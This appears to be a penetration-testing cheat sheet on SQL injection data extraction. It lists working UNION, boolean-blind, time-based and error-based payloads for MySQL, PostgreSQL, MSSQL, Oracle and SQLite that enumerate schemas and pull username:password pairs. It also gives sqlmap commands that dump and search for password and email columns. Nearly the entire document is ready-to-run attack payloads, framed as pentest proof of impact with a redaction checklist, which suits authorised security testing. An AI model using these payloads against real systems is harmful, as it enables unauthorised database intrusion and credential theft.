# Data Extraction Techniques

## Goals
- Extract schema information (databases, tables, columns)
- Extract minimal data as proof of impact
- Techniques organized by injection type and DBMS

## UNION-Based Extraction (Fastest)

### MySQL
```sql
-- Step 1: Find column count
' ORDER BY 1-- -    (increment until error)
-- OR
' UNION SELECT NULL-- -    (increment NULLs until no error)

-- Step 2: Find displayable columns
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -

-- Step 3: Extract schema
' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata-- -
' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Step 4: Extract data (minimal)
' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL,NULL FROM users LIMIT 3-- -
```

### PostgreSQL
```sql
' UNION SELECT string_agg(datname,','),NULL FROM pg_database-- -
' UNION SELECT string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'-- -
' UNION SELECT string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'-- -
```

### MSSQL
```sql
' UNION SELECT name,NULL FROM master..sysdatabases-- -
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- -
' UNION SELECT TOP 1 username+':'+password,NULL FROM users-- -
```

### Oracle
```sql
' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM<=20-- -
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
' UNION SELECT username||':'||password,NULL FROM users WHERE ROWNUM<=3-- -
```

### SQLite
```sql
' UNION SELECT GROUP_CONCAT(name),NULL FROM sqlite_master WHERE type='table'-- -
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'-- -
' UNION SELECT GROUP_CONCAT(username||':'||password,char(10)),NULL FROM users-- -
```

## Boolean-Based Blind Extraction

### Binary Search Algorithm
```sql
-- Extract database name, character by character
-- Character 1: Is ASCII value > 96?
' AND ASCII(SUBSTRING(database(),1,1))>96-- -    → true/false
' AND ASCII(SUBSTRING(database(),1,1))>109-- -   → narrow range
' AND ASCII(SUBSTRING(database(),1,1))>103-- -   → narrow further
-- Continue until exact value found (typically 7 comparisons per character)

-- Extract length first
' AND LENGTH(database())>5-- -
' AND LENGTH(database())>10-- -
' AND LENGTH(database())=8-- -
```

### Optimized Extraction
```sql
-- Extract via bit shifting (7 requests per character guaranteed)
' AND (ASCII(SUBSTRING(database(),1,1))>>6)&1=1-- -   → bit 6
' AND (ASCII(SUBSTRING(database(),1,1))>>5)&1=1-- -   → bit 5
-- ... down to bit 0
-- Reconstruct byte from bits
```

## Time-Based Blind Extraction

### MySQL
```sql
' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(2),0)-- -
' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>96,SLEEP(2),0)-- -
```

### MSSQL
```sql
'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>96) WAITFOR DELAY '0:0:2'-- -
```

### PostgreSQL
```sql
' AND CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>96 THEN pg_sleep(2) ELSE pg_sleep(0) END-- -
```

## Error-Based Extraction

### MySQL (extractvalue/updatexml)
```sql
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -
' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)-- -
```

### MSSQL (CONVERT)
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))-- -
-- Skip already-extracted rows:
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users WHERE username NOT IN ('admin')))-- -
```

### PostgreSQL (CAST)
```sql
' AND 1=CAST((SELECT version()) AS int)-- -
' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS int)-- -
```

## sqlmap Automated Extraction
```bash
# Step-by-step enumeration
sqlmap -u URL --batch --dbs                          # List databases
sqlmap -u URL --batch -D target_db --tables          # List tables
sqlmap -u URL --batch -D target_db -T users --columns  # List columns
sqlmap -u URL --batch -D target_db -T users -C "username,password" --dump  # Extract specific columns

# Limit rows
sqlmap -u URL --batch -D target_db -T users --dump --start=1 --stop=5

# Search for interesting columns across all tables
sqlmap -u URL --batch --search -C "password"
sqlmap -u URL --batch --search -C "email"
sqlmap -u URL --batch --search -T "admin"
```

## Evidence Checklist
- [ ] Schema enumeration results (databases, tables, columns)
- [ ] Minimal data extraction proof (1-3 rows, redacted)
- [ ] Extraction method used (UNION, blind, error, time)
- [ ] Redaction applied to any sensitive data
